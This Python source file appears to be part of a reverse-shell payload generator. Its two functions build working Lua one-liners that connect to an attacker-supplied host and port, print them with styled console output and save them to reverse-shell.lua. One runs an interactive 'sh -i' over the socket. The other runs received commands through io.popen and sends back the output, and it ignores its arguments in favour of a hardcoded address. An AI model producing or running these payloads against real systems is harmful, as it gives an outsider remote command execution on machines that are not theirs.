from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def Lua1(ip, port):
    payload = f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('sh -i <&3 >&3 2>&3');\""
    with open("reverse-shell.lua", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="boxBounce2"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"lua",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.lua\n[/#aed06d]", style=myStyle)

def Lua2(ip, port):
    payload = f"lua5.1 -e 'local host, port = \"10.10.10.10\", 9001 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"
    with open("reverse-shell.lua", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="boxBounce2"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"lua",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.lua\n[/#aed06d]", style=myStyle)